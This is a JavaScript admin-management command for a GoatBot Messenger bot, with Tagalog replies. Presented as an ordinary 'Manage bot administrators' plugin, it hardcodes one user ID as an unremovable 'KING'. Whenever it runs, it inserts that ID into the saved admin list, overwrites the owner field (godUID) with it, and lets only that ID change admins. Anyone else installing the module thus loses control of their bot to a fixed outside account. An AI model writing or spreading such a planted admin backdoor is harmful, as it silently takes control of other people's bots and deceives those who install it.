
const { config } = global.GoatBot;
const { writeFileSync } = require("fs-extra");

const KING_UID = "61596378937611";

function normalizeAdmins() {
  if (!Array.isArray(config.adminBot)) {
    config.adminBot = [];
  }

  // Laging kasama ang KING sa admin list
  config.adminBot = [
    KING_UID,
    ...config.adminBot.map(String).filter(id => id !== KING_UID)
  ];
}

function saveConfig() {
  normalizeAdmins();

  writeFileSync(
    global.client.dirConfig,
    JSON.stringify(config, null, 2),
    "utf8"
  );
}

module.exports = {
  config: {
    name: "admin",
    version: "4.0",
    author: "Edward",
    countDown: 3,
    role: 0,
    description: {
      en: "Manage bot administrators"
    },
    category: "box chat",
    guide: {
      en: "{pn} add (reply)\n{pn} remove (reply)\n{pn} list"
    }
  },

  onStart: async function ({ message, args, event }) {
    normalizeAdmins();

    const sender = String(event.senderID);

    // KING ONLY
    if (sender !== KING_UID) {
      return message.reply("❌ KING / MONITOR LANG ANG PUWEDENG MAG-MANAGE.");
    }

    // Ensure correct owner config
    config.godUID = KING_UID;

    const action = String(args[0] || "").toLowerCase();

    function getTargetUID() {
      if (args[1]) {
        const id = String(args[1]).replace(/[^\d]/g, "");
        if (id) return id;
      }

      if (event.mentions) {
        const id = Object.keys(event.mentions)[0];
        if (id) return String(id);
      }

      if (event.messageReply?.senderID) {
        return String(event.messageReply.senderID);
      }

      return "";
    }

    switch (action) {
      case "add":
      case "-a": {
        const id = getTargetUID();

        if (!id) {
          return message.reply("⚠️ I-reply ang command sa member.");
        }

        if (id === KING_UID) {
          return message.reply("👑 Ikaw ang KING / MONITOR.");
        }

        if (config.adminBot.includes(id)) {
          return message.reply("⚠️ ADMIN na ang member na ito.");
        }

        config.adminBot.push(id);
        saveConfig();

        return message.reply(
          `✅ ADMIN ADDED\n\nUID: ${id}\n\n👑 KING: ${KING_UID}`
        );
      }

      case "remove":
      case "-r": {
        const id = getTargetUID();

        if (!id) {
          return message.reply("⚠️ I-reply ang command sa admin.");
        }

        if (id === KING_UID) {
          return message.reply("❌ Hindi puwedeng alisin ang KING.");
        }

        if (!config.adminBot.includes(id)) {
          return message.reply("⚠️ Hindi ADMIN ang UID na ito.");
        }

        config.adminBot = config.adminBot.filter(uid => uid !== id);
        saveConfig();

        return message.reply(`✅ ADMIN REMOVED\n\nUID: ${id}`);
      }

      case "list": {
        const admins = config.adminBot.filter(
          id => String(id) !== KING_UID
        );

        let output = `👑 KING / MONITOR\nUID: ${KING_UID}\n\n`;
        output += "🛡️ ADMIN LIST\n\n";

        output += admins.length
          ? admins.map((id, i) => `${i + 1}. UID: ${id}`).join("\n")
          : "Wala pang ADMIN.";

        return message.reply(output);
      }

      default:
        return message.reply(
          "👑 KING / MONITOR\n\n" +
          "➕ /admin add\n" +
          "➖ /admin remove\n" +
          "📋 /admin list"
        );
    }
  }
};
          
